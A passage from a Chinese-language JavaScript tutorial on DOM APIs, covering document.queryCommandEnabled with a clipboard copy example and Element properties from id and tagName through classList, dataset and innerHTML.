<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">queryCommandSupported</span>(<span class="string">&#x27;SelectAll&#x27;</span>)) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;浏览器支持选中可编辑区域的所有内容&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="（3）document-queryCommandEnabled-当前是否可用execCommand的某个命令"><a href="#（3）document-queryCommandEnabled-当前是否可用execCommand的某个命令" class="headerlink" title="（3）document.queryCommandEnabled() 当前是否可用execCommand的某个命令"></a>（3）document.queryCommandEnabled() 当前是否可用execCommand的某个命令</h5><p><code>document.queryCommandEnabled()</code>方法返回一个布尔值，表示当前是否可用<code>document.execCommand()</code>的某个命令。比如，<code>bold</code>（加粗）命令只有存在文本选中时才可用，如果没有选中文本，就不可用。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;button&quot; value=&quot;Copy&quot; onclick=&quot;doCopy()&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doCopy</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// 浏览器是否支持 copy 命令（选中内容复制到剪贴板）</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">queryCommandSupported</span>(<span class="string">&#x27;copy&#x27;</span>)) &#123;</span><br><span class="line">    <span class="title function_">copyText</span>(<span class="string">&#x27;你好&#x27;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;浏览器不支持&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyText</span>(<span class="params">text</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> input = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;textarea&#x27;</span>);</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(input);</span><br><span class="line">  input.<span class="property">value</span> = text;</span><br><span class="line">  input.<span class="title function_">focus</span>();</span><br><span class="line">  input.<span class="title function_">select</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当前是否有选中文字</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">queryCommandEnabled</span>(<span class="string">&#x27;copy&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">var</span> success = <span class="variable language_">document</span>.<span class="title function_">execCommand</span>(<span class="string">&#x27;copy&#x27;</span>);</span><br><span class="line">    input.<span class="title function_">remove</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Copy Ok&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;queryCommandEnabled is false&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，先判断浏览器是否支持<code>copy</code>命令（允许可编辑区域的选中内容，复制到剪贴板），如果支持，就新建一个临时文本框，里面写入内容“你好”，并将其选中。然后，判断是否选中成功，如果成功，就将“你好”复制到剪贴板，再删除那个临时文本框。</p>
<h4 id="3-21-document-getSelection"><a href="#3-21-document-getSelection" class="headerlink" title="3.21 document.getSelection()"></a>3.21 document.getSelection()</h4><p>这个方法指向<code>window.getSelection()</code>，参见<code>window</code>对象一节的介绍。</p>
<h2 id="六、Element节点"><a href="#六、Element节点" class="headerlink" title="六、Element节点"></a>六、Element节点</h2><p><strong><code>Element</code>节点对象对应网页的 HTML 元素。每一个 HTML 元素，在 DOM 树上都会转化成一个<code>Element</code>节点对象（以下简称元素节点）。</strong></p>
<p>元素节点的<code>nodeType</code>属性都是<code>1</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">p.<span class="property">nodeName</span> <span class="comment">// &quot;P&quot;</span></span><br><span class="line">p.<span class="property">nodeType</span> <span class="comment">// 1  节点类型 1代表元素节点</span></span><br></pre></td></tr></table></figure>

<p><code>Element</code>对象继承了<code>Node</code>接口，因此**<code>Node</code>的属性和方法在<code>Element</code>对象都存在<strong>。此外，</strong>不同的 HTML 元素对应的元素节点是不一样的，浏览器使用不同的构造函数，生成不同的元素节点**，比如<code> &lt;a&gt; </code>元素的节点对象由<code>HTMLAnchorElement</code>构造函数生成，<code>&lt;button&gt;</code>元素的节点对象由<code>HTMLButtonElement</code>构造函数生成。因此，元素节点不是一种对象，而是一组对象，这些对象除了继承<code>Element</code>的属性和方法，还有各自构造函数的属性和方法。</p>
<p><strong>元素节点拥有 各自构造函数 的属性和方法，继承<code>Element</code>的属性和方法，同时继承<code>Node</code>的属性和方法。</strong></p>
<h3 id="1、实例属性"><a href="#1、实例属性" class="headerlink" title="1、实例属性"></a>1、实例属性</h3><h4 id="1-1-元素特性的相关属性"><a href="#1-1-元素特性的相关属性" class="headerlink" title="1.1 元素特性的相关属性"></a>1.1 元素特性的相关属性</h4><h5 id="（1）Element-id-返回元素ID属性，可读写"><a href="#（1）Element-id-返回元素ID属性，可读写" class="headerlink" title="（1）Element.id 返回元素ID属性，可读写"></a>（1）Element.id 返回元素ID属性，可读写</h5><p><code>Element.id</code>属性<strong>返回指定元素的<code>id</code>属性，该属性可读写。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为 &lt;p id=&quot;foo&quot;&gt;</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">p.<span class="property">id</span> <span class="comment">// &quot;foo&quot;</span></span><br></pre></td></tr></table></figure>

<p>注意，<code>id</code>属性的值是<strong>大小写敏感</strong>，即浏览器能正确识别<code> &lt;p id=&quot;foo&quot;&gt; </code>和<code> &lt;p id=&quot;FOO&quot;&gt; </code>这两个元素的<code>id</code>属性，但是最好不要这样命名。</p>
<h5 id="（2）Element-tagName-返回元素的大写标签"><a href="#（2）Element-tagName-返回元素的大写标签" class="headerlink" title="（2）Element.tagName 返回元素的大写标签"></a>（2）Element.tagName 返回元素的大写标签</h5><p><code>Element.tagName</code>属性<strong>返回指定元素的大写标签名，与<code>nodeName</code>属性的值相等。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML代码为</span></span><br><span class="line"><span class="comment">// &lt;span id=&quot;myspan&quot;&gt;Hello&lt;/span&gt;</span></span><br><span class="line"><span class="keyword">var</span> span = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myspan&#x27;</span>);</span><br><span class="line">span.<span class="property">id</span> <span class="comment">// &quot;myspan&quot;</span></span><br><span class="line">span.<span class="property">tagName</span> <span class="comment">// &quot;SPAN&quot;</span></span><br></pre></td></tr></table></figure>



<h5 id="（3）Element-dir-元素的文字方向，可读写（ltr、rtl）"><a href="#（3）Element-dir-元素的文字方向，可读写（ltr、rtl）" class="headerlink" title="（3）Element.dir 元素的文字方向，可读写（ltr、rtl）"></a>（3）Element.dir 元素的文字方向，可读写（ltr、rtl）</h5><p><code>Element.dir</code>属性<strong>用于读写当前元素的文字方向</strong>，可能是从左到右（<code>&quot;ltr&quot;</code>），也可能是从右到左（<code>&quot;rtl&quot;</code>）。</p>
<h5 id="（4）Element-accessKey-分配给当前元素的快捷键，可读写"><a href="#（4）Element-accessKey-分配给当前元素的快捷键，可读写" class="headerlink" title="（4）Element.accessKey 分配给当前元素的快捷键，可读写"></a>（4）Element.accessKey 分配给当前元素的快捷键，可读写</h5><p><code>Element.accessKey</code>属性<strong>用于读写分配给当前元素的快捷键</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;button accesskey=&quot;h&quot; id=&quot;btn&quot;&gt;点击&lt;/button&gt;</span></span><br><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line">btn.<span class="property">accessKey</span> <span class="comment">// &quot;h&quot;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>btn</code>元素的快捷键是<code>h</code>，按下<code>Alt + h</code>就能将焦点转移到它上面。</p>
<h5 id="（5）Element-draggable-当前元素是否可拖动，布尔值，可读写"><a href="#（5）Element-draggable-当前元素是否可拖动，布尔值，可读写" class="headerlink" title="（5）Element.draggable 当前元素是否可拖动，布尔值，可读写"></a>（5）Element.draggable 当前元素是否可拖动，布尔值，可读写</h5><p><code>Element.draggable</code>属性<strong>返回一个布尔值，表示当前元素是否可拖动。该属性可读写。</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">ondragstart</span>=<span class="string">&quot;drag(this)&quot;</span>&gt;</span>这是一段可移动的段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">drag</span>(<span class="params">el</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(el.<span class="property">draggable</span>) <span class="comment">// true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="（6）Element-lang-返回当前元素的语言设置，可读写"><a href="#（6）Element-lang-返回当前元素的语言设置，可读写" class="headerlink" title="（6）Element.lang 返回当前元素的语言设置，可读写"></a>（6）Element.lang 返回当前元素的语言设置，可读写</h5><p><code>Element.lang</code>属性<strong>返回当前元素的语言设置。该属性可读写。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">lang</span> <span class="comment">// &quot;en&quot;</span></span><br></pre></td></tr></table></figure>



<h5 id="（7）Element-tabIndex-当前元素在-Tab-键遍历时的顺序，整数，可读写"><a href="#（7）Element-tabIndex-当前元素在-Tab-键遍历时的顺序，整数，可读写" class="headerlink" title="（7）Element.tabIndex 当前元素在 Tab 键遍历时的顺序，整数，可读写"></a>（7）Element.tabIndex 当前元素在 Tab 键遍历时的顺序，整数，可读写</h5><p><code>Element.tabIndex</code>属性<strong>返回一个整数，表示当前元素在 Tab 键遍历时的顺序。该属性可读写。</strong></p>
<p><code>tabIndex</code>属性值<strong>如果是负值（通常是<code>-1</code>），则 Tab 键不会遍历到该元素</strong>。如果是正整数，则按照顺序，从小到大遍历。如果两个元素的<code>tabIndex</code>属性的正整数值相同，则按照出现的顺序遍历。遍历完所有<code>tabIndex</code>为正整数的元素以后，再遍历所有<code>tabIndex</code>等于<code>0</code>、或者属性值是非法值、或者没有<code>tabIndex</code>属性的元素，顺序为它们在网页中出现的顺序。</p>
<h5 id="（8）Element-title-当前元素的-HTML-属性title，可读写"><a href="#（8）Element-title-当前元素的-HTML-属性title，可读写" class="headerlink" title="（8）Element.title 当前元素的 HTML 属性title，可读写"></a>（8）Element.title 当前元素的 HTML 属性<code>title</code>，可读写</h5><p><code>Element.title</code>属性<strong>用来读写当前元素的 HTML 属性<code>title</code>。该属性通常用来指定，鼠标悬浮时弹出的文字提示框。</strong></p>
<h4 id="1-2-元素状态的相关属性"><a href="#1-2-元素状态的相关属性" class="headerlink" title="1.2 元素状态的相关属性"></a>1.2 元素状态的相关属性</h4><h5 id="（1）Element-hidden-当前元素的hidden属性，控制是否可见，布尔值，可读写"><a href="#（1）Element-hidden-当前元素的hidden属性，控制是否可见，布尔值，可读写" class="headerlink" title="（1）Element.hidden 当前元素的hidden属性，控制是否可见，布尔值，可读写"></a>（1）Element.hidden 当前元素的hidden属性，控制是否可见，布尔值，可读写</h5><p><code>Element.hidden</code>属性<strong>返回一个布尔值，表示当前元素的<code>hidden</code>属性，用来控制当前元素是否可见。该属性可读写。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> mydiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  mydiv.<span class="property">hidden</span> = !mydiv.<span class="property">hidden</span>;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>

<p><strong>注意，该属性与 CSS 设置是互相独立的</strong>。CSS 对这个元素可见性的设置，<code>Element.hidden</code>并不能反映出来。也就是说，这个属性并不能用来判断当前元素的实际可见性。</p>
<p><strong>CSS 的设置高于<code>Element.hidden</code>。</strong>如果 CSS 指定了该元素不可见（<code>display: none</code>）或可见（<code>display: hidden</code>），那么<code>Element.hidden</code>并不能改变该元素实际的可见性。换言之，<strong>这个属性只在 CSS 没有明确设定当前元素的可见性时才有效。</strong></p>
<h5 id="（2）Element-contentEditable元素内容的可编辑性，字符串，可读写，"><a href="#（2）Element-contentEditable元素内容的可编辑性，字符串，可读写，" class="headerlink" title="（2）Element.contentEditable元素内容的可编辑性，字符串，可读写，"></a>（2）Element.contentEditable元素内容的可编辑性，字符串，可读写，</h5><h5 id="Element-isContentEditable-元素内容是否可编辑，布尔值，只读"><a href="#Element-isContentEditable-元素内容是否可编辑，布尔值，只读" class="headerlink" title="Element.isContentEditable 元素内容是否可编辑，布尔值，只读"></a>Element.isContentEditable 元素内容是否可编辑，布尔值，只读</h5><p>HTML 元素可以设置<code>contentEditable</code>属性，使得元素的内容可以编辑。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">contenteditable</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code> &lt;div&gt; </code>元素有<code>contenteditable</code>属性，因此用户可以在网页上编辑这个区块的内容。</p>
<p><code>Element.contentEditable</code>属性返回一个字符串，表示是否设置了<code>contenteditable</code>属性，有三种可能的值。该属性可写。</p>
<ul>
<li><code>&quot;true&quot;</code>：元素内容可编辑</li>
<li><code>&quot;false&quot;</code>：元素内容不可编辑</li>
<li><code>&quot;inherit&quot;</code>：元素是否可编辑，继承了父元素的设置</li>
</ul>
<p><code>Element.isContentEditable</code>属性返回一个布尔值，同样表示是否设置了<code>contenteditable</code>属性。该属性只读。</p>
<h4 id="1-3-Element-attributes-类数组，成员是元素的所有HTML属性节点"><a href="#1-3-Element-attributes-类数组，成员是元素的所有HTML属性节点" class="headerlink" title="1.3 Element.attributes 类数组，成员是元素的所有HTML属性节点"></a>1.3 Element.attributes 类数组，成员是元素的所有HTML属性节点</h4><p><code>Element.attributes</code>属性<strong>返回一个类似数组的对象，成员是当前元素节点的所有属性节点</strong>，详见《属性的操作》一章。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> attrs = p.<span class="property">attributes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = attrs.<span class="property">length</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(attrs[i].<span class="property">name</span> + <span class="string">&#x27;-&gt;&#x27;</span> + attrs[i].<span class="property">value</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码遍历<code>p</code>元素的所有属性。</p>
<h4 id="1-4-Element-className-元素的class，Element-classList-类数组，成员是各class，有自身方法"><a href="#1-4-Element-className-元素的class，Element-classList-类数组，成员是各class，有自身方法" class="headerlink" title="1.4 Element.className 元素的class，Element.classList 类数组，成员是各class，有自身方法"></a>1.4 Element.className 元素的class，Element.classList 类数组，成员是各class，有自身方法</h4><p><code>className</code>属性<strong>用来读写当前元素节点的<code>class</code>属性。</strong>它的值是一个字符串，每个<code>class</code>之间用空格分割。</p>
<p><code>classList</code>属性<strong>返回一个类似数组的对象，当前元素节点的每个<code>class</code>就是这个对象的一个成员。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HTML 代码 &lt;div class=&quot;one two three&quot; id=&quot;myDiv&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myDiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.<span class="property">className</span></span><br><span class="line"><span class="comment">// &quot;one two three&quot;</span></span><br><span class="line"></span><br><span class="line">div.<span class="property">classList</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//   0: &quot;one&quot;</span></span><br><span class="line"><span class="comment">//   1: &quot;two&quot;</span></span><br><span class="line"><span class="comment">//   2: &quot;three&quot;</span></span><br><span class="line"><span class="comment">//   length: 3</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>className</code>属性返回一个空格分隔的字符串，而<code>classList</code>属性指向一个类似数组的对象，该对象的<code>length</code>属性（只读）返回当前元素的<code>class</code>数量。</p>
<h6 id="classList对象有下列方法。"><a href="#classList对象有下列方法。" class="headerlink" title="classList对象有下列方法。"></a><code>classList</code>对象有下列方法。</h6><ul>
<li><strong><code>add()</code>：增加一个 class。</strong></li>
<li><strong><code>remove()</code>：移除一个 class。</strong></li>
<li><strong><code>contains()</code>：检查当前元素是否包含某个 class。</strong></li>
<li><strong><code>toggle()</code>：将某个 class 移入或移出当前元素。</strong></li>
<li><strong><code>item()</code>：返回指定索引位置的 class。</strong></li>
<li><strong><code>toString()</code>：将 class 的列表转为字符串。</strong></li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;myDiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">div.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;myCssClass&#x27;</span>);</span><br><span class="line">div.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>);</span><br><span class="line">div.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;myCssClass&#x27;</span>);</span><br><span class="line">div.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;myCssClass&#x27;</span>); <span class="comment">// 如果 myCssClass 不存在就加入，否则移除</span></span><br><span class="line">div.<span class="property">classList</span>.<span class="title function_">contains</span>(<span class="string">&#x27;myCssClass&#x27;</span>); <span class="comment">// 返回 true 或者 false</span></span><br><span class="line">div.<span class="property">classList</span>.<span class="title function_">item</span>(<span class="number">0</span>); <span class="comment">// 返回第一个 Class</span></span><br><span class="line">div.<span class="property">classList</span>.<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure>

<p>下面比较一下，<code>className</code>和<code>classList</code>在添加和删除某个 class 时的写法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加class</span></span><br><span class="line">foo.<span class="property">className</span> += <span class="string">&#x27;bold&#x27;</span>;</span><br><span class="line">foo.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;bold&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除class</span></span><br><span class="line">foo.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;bold&#x27;</span>);</span><br><span class="line">foo.<span class="property">className</span> = foo.<span class="property">className</span>.<span class="title function_">replace</span>(<span class="regexp">/^bold$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><strong><code>toggle</code>方法可以接受一个布尔值，作为第二个参数。</strong>如果为<code>true</code>，则添加该属性；如果为<code>false</code>，则去除该属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">el.<span class="property">classList</span>.<span class="title function_">toggle</span>(<span class="string">&#x27;abc&#x27;</span>, boolValue);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">if</span> (boolValue) &#123;</span><br><span class="line">  el.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  el.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;abc&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="1-5-Element-dataset-返回一个对象，读写元素的data-属性"><a href="#1-5-Element-dataset-返回一个对象，读写元素的data-属性" class="headerlink" title="1.5 Element.dataset 返回一个对象，读写元素的data-属性"></a>1.5 Element.dataset 返回一个对象，读写元素的data-属性</h4><p>网页元素可以自定义<code>data-</code>属性，用来添加数据。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-timestamp=<span class="string">&quot;1522907809292&quot;</span>&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code> &lt;div&gt; </code>元素有一个自定义的<code>data-timestamp</code>属性，用来为该元素添加一个时间戳。</p>
<p><code>Element.dataset</code>属性<strong>返回一个对象，可以从这个对象读写<code>data-</code>属性。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;article</span></span><br><span class="line"><span class="comment">//   id=&quot;foo&quot;</span></span><br><span class="line"><span class="comment">//   data-columns=&quot;3&quot;</span></span><br><span class="line"><span class="comment">//   data-index-number=&quot;12314&quot;</span></span><br><span class="line"><span class="comment">//   data-parent=&quot;cars&quot;&gt;</span></span><br><span class="line"><span class="comment">//   ...</span></span><br><span class="line"><span class="comment">// &lt;/article&gt;</span></span><br><span class="line"><span class="keyword">var</span> article = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;foo&#x27;</span>);</span><br><span class="line">article.<span class="property">dataset</span>.<span class="property">columns</span> <span class="comment">// &quot;3&quot;</span></span><br><span class="line">article.<span class="property">dataset</span>.<span class="property">indexNumber</span> <span class="comment">// &quot;12314&quot;</span></span><br><span class="line">article.<span class="property">dataset</span>.<span class="property">parent</span> <span class="comment">// &quot;cars&quot;</span></span><br></pre></td></tr></table></figure>

<p>注意，<code>dataset</code>上面的各个属性返回都是字符串。</p>
<p>HTML 代码中，<code>data-</code>属性的属性名，只能包含英文字母、数字、连词线（<code>-</code>）、点（<code>.</code>）、冒号（<code>:</code>）和下划线（<code>_</code>）。它们转成 JavaScript 对应的<code>dataset</code>属性名，<strong>规则如下</strong>。</p>
<ul>
<li><strong>开头的<code>data-</code>会省略。</strong></li>
<li><strong>如果连词线后面跟了一个英文字母，那么连词线会取消，该字母变成大写。</strong></li>
<li><strong>其他字符不变。</strong></li>
</ul>
<p>因此，<code>data-abc-def</code>对应<code>dataset.abcDef</code>，<code>data-abc-1</code>对应<code>dataset[&quot;abc-1&quot;]</code>。</p>
<p>除了使用<code>dataset</code>读写<code>data-</code>属性，也<strong>可以使用<code>Element.getAttribute()</code>和<code>Element.setAttribute()</code>，通过完整的属性名读写这些属性。</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mydiv = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;mydiv&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mydiv.<span class="property">dataset</span>.<span class="property">foo</span> = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line">mydiv.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-foo&#x27;</span>) <span class="comment">// &quot;bar&quot;</span></span><br></pre></td></tr></table></figure>



<h4 id="1-6-Element-innerHTML-返回一个字符串，是元素包含的所有-HTML-代码，可读写"><a href="#1-6-Element-innerHTML-返回一个字符串，是元素包含的所有-HTML-代码，可读写" class="headerlink" title="1.6 Element.innerHTML 返回一个字符串，是元素包含的所有 HTML 代码，可读写"></a>1.6 Element.innerHTML 返回一个字符串，是元素包含的所有 HTML 代码，可读写</h4><p><code>Element.innerHTML</code>属性<strong>返回一个字符串，等同于该元素包含的所有 HTML 代码</strong>。该属性<strong>可读写</strong>，常用来设置某个节点的内容。它能改写所有元素节点的内容，包括<code>&lt;HTML&gt;</code>和<code>&lt;body&gt;</code>元素。</p>
<p>如果将<code>innerHTML</code>属性设为空，等于删除所有它包含的所有节点。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">el.<span class="property">innerHTML</span> = <span class="string">&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>上面代码等于将<code>el</code>节点变成了一个空节点，<code>el</code>原来包含的节点被全部删除。</p>
